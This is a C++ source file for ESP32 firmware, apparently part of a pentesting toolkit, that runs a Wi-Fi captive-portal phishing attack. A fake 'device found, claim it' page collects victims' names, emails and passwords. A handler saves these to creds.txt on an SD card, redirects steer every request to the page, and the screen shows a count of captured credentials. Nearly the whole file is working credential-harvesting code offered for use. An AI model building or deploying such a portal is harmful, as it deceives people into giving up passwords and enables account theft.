#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <SD.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <globals.h>

static AsyncWebServer *phishServer = nullptr;
static int credsCaptured = 0;

static const char DEVFOUND_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>Device Found</title>
<style>body{font-family:sans-serif;background:#1a1a2e;color:#e0e0e0;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.c{text-align:center;max-width:400px;width:90%}
.icon{font-size:4rem;margin-bottom:12px}
input{width:80%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:6px;background:#0a0a0f;color:#e0e0e0;box-sizing:border-box}
button{width:80%;padding:12px;margin-top:8px;border:none;border-radius:6px;background:#00ff88;color:#000;font-weight:bold;cursor:pointer}
h2{color:#00ff88}p{font-size:0.85rem;color:#888}</style></head>
<body><div class="c"><div class="icon">&#128225;</div>
<h2>A device was found near you</h2>
<p>Enter your details to claim it</p>
<input type="text" placeholder="Full name" name="name"><br>
<input type="email" placeholder="Email" name="email"><br>
<input type="password" placeholder="Password" name="pass"><br>
<button onclick="fetch('/submit',{method:'POST',body:JSON.stringify({n:document.querySelector('[name=name]').value,e:document.querySelector('[name=email]').value,p:document.querySelector('[name=pass]').value})}).then(()=>this.textContent='Claimed!')">Claim Device</button></div></body></html>
)rawliteral";

static void setupPhishRoutes() {
    phishServer->on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/html", DEVFOUND_HTML);
    });
    phishServer->on("/submit", HTTP_POST, [](AsyncWebServerRequest *request) {},
        NULL,
        [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
            credsCaptured++;
            if (setupSdCard()) {
                File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
                if (f) { f.println("[devfound] " + String((char *)data).substring(0, len)); f.close(); }
            }
            request->send(200, "application/json", "{\"ok\":true}");
        });
    phishServer->on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("http://192.168.4.1");
    });
    phishServer->onNotFound([](AsyncWebServerRequest *request) {
        request->redirect("http://192.168.4.1");
    });
}

void arsenal_phish_device_found(void) {
    ARSENAL_HEAP_CHECK();
    credsCaptured = 0;
    phishServer = new AsyncWebServer(80);
    setupPhishRoutes();
    phishServer->begin();

    while (true) {
        drawMainBorderWithTitle("Phish DevFound");
        int y = 45;
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, y);
        tft.printf("Clients: %d  Creds: %d", WiFi.softAPgetStationNum(), credsCaptured);
        y += 14;
        tft.setCursor(12, y);
        tft.printf("IP: %s", WiFi.softAPIP().toString().c_str());
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);
        if (check(EscPress)) break;
        delay(200);
    }

    phishServer->end();
    delete phishServer;
    phishServer = nullptr;
}
